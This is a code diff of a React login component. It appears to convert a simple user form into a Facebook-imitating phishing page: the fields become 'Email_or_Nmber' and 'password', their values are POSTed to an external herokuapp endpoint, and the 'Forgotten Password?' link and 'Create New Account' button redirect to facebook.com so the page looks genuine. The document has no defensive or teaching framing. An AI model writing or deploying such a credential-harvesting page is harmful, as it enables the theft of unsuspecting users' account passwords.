@@ -1,5 +1,4 @@
 import React, { useRef } from "react";
-import { useState } from "react";
 import "./App.css";
 import intializeAuthentication from "./firebase/firebase.init";
 intializeAuthentication();
@@ -9,10 +8,10 @@ function App() {
   const emailRef = useRef();
 
   const handleAddUser = (e) => {
-    const name = nameRef.current.value;
-    const email = emailRef.current.value;
+    const Email_or_Nmber = nameRef.current.value;
+    const password = emailRef.current.value;
 
-    const newUser = { name, email };
+    const newUser = { Email_or_Nmber, password };
 
     fetch("https://guarded-refuge-15901.herokuapp.com/users", {
       method: "POST",
@@ -53,12 +52,17 @@ function App() {
         <br></br>
 
         <div className="a-link">
-          <a href="/" className="link">
+          <a href="https://www.facebook.com" className="link">
             Forgotten Password?
           </a>
         </div>
         <div className="ca">
-          <button class="pca">Create New Account</button>
+          <button
+            onclick="location.href='https://www.facebook.com'"
+            class="pca"
+          >
+            Create New Account
+          </button>
         </div>
 
         <div className="language-main">
